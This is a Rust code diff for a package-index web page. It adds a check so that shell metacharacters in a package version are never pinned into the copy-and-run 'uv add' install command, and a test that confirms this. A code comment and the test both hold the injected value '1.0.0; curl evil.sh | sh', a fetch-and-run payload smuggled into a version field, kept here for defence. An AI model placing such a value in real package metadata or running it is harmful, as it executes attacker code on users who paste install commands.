@@ -627,6 +627,23 @@ pub fn audit_html(ctx: &PageContext, report: Option<&Report>, absent_note: &str)
     shell("pypiron · audit", "", &body, false, false)
 }
 
+/// A version is safe to interpolate into the copy-and-run install command only
+/// when its spelling carries no shell metacharacters *and* it is a real PEP 440
+/// version. The charset gate is the security guarantee — every shell-dangerous
+/// byte (`;` `|` `&` `$` `` ` `` `(` `)` `<` `>` `*` `?` quotes, whitespace,
+/// newline) is excluded, so the value can only ever be one literal argument. The
+/// PEP 440 parse then ensures we pin only genuine versions, never charset-clean
+/// junk. Epoch (`!`) is deliberately not in the charset: it is vanishingly rare
+/// and is history-expansion in an interactive shell, so such a version drops the
+/// pin rather than pinning `foo==1!2.0`.
+fn version_is_shell_safe(version: &str) -> bool {
+    !version.is_empty()
+        && version
+            .bytes()
+            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'-' | b'_' | b'+'))
+        && version.parse::<pep440_rs::Version>().is_ok()
+}
+
 /// A human-readable project page modelled on pypi.org. `files` is *every*
 /// artifact for the package (any order); `selected` is the version this view
 /// focuses on — the latest, or the one in the URL on a per-version page — and
@@ -654,8 +671,16 @@ pub fn project_html(
     // page and `uv add`); the copy button reads it from the DOM.
     let index_copy = copy_field(&index_url, "idxbox", "Copy index URL");
 
-    // Install command: `uv add` only, pinned to the version on a version page.
-    let target = if pinned && !selected.is_empty() {
+    // Install command: `uv add` only, pinned to the version on a version page —
+    // but only when that version is safe to paste into a shell. This snippet is
+    // copy-and-run, so a hostile version like `1.0; curl evil.sh | sh` would run
+    // when a human pastes it. HTML-escaping is no defense: `;`, `|`, `$()` and
+    // backticks all survive it and stay live in a shell. Versions aren't PEP 440
+    // -validated at upload (wheel filenames pass through raw — see publish.rs),
+    // so a non-conforming version drops the pin (`uv add … {pkg}`); the version
+    // still shows as inert escaped text in the banner. The name is always PEP 503
+    // normalized ([a-z0-9-], no shell metacharacters) so it needs no such guard.
+    let target = if pinned && version_is_shell_safe(selected) {
         format!("{pkg}=={selected}")
     } else {
         pkg.to_string()
@@ -1419,6 +1444,49 @@ mod tests {
         let dl = &html[html.find("id=\"files\"").unwrap()..];
         assert!(dl.contains("imaginAIry-14.3.0-py3-none-any.whl"));
         assert!(!dl.contains("imaginAIry-15.0.0-py3-none-any.whl"));
+    }
+
+    #[test]
+    fn shell_injection_version_never_pins_into_runnable_command() {
+        // A hostile package stores a version carrying shell metacharacters (wheel
+        // filenames aren't PEP 440-validated at upload). The copy-and-run install
+        // snippet must not embed it, or a human pasting the command runs the
+        // payload. HTML-escaping doesn't help — `;`, `|`, spaces survive it.
+        let evil = "1.0.0; curl evil.sh | sh";
+        let files = [file(
+            "x-1.0.0-py3-none-any.whl",
+            evil,
+            "2026-01-01T00:00:00Z",
+        )];
+        let html = project_html(&ctx(), "x", &files, evil, true, None, None, &[], &[]);
+
+        // Isolate the install command box (the index-URL field is `install idxbox`).
+        let start = html.find("<div class=\"install\"><code>").unwrap();
+        let code = &html[start..start + html[start..].find("</code>").unwrap()];
+        // No live shell metacharacters, and no injected command, reach the snippet.
+        assert!(!code.contains(';'), "snippet carries `;`: {code}");
+        assert!(!code.contains('|'), "snippet carries `|`: {code}");
+        assert!(
+            !code.contains("curl"),
+            "snippet carries injected cmd: {code}"
+        );
+        // It falls back to the unpinned form — name only, no `==` pin.
+        assert!(!code.contains("=="), "hostile version was pinned: {code}");
+        assert_eq!(
+            code,
+            "<div class=\"install\"><code>uv add --index https://pkgs.example.com/simple/ x"
+        );
+        // The version is not lost: it still shows as inert escaped text in the banner.
+        assert!(html.contains("<span class=\"pver\">1.0.0; curl evil.sh | sh</span>"));
+
+        // A genuine version on the same path still pins, byte-for-byte as before.
+        let good = [file(
+            "x-1.0.0-py3-none-any.whl",
+            "1.0.0",
+            "2026-01-01T00:00:00Z",
+        )];
+        let ok = project_html(&ctx(), "x", &good, "1.0.0", true, None, None, &[], &[]);
+        assert!(ok.contains("uv add --index https://pkgs.example.com/simple/ x==1.0.0"));
     }
 
     #[test]
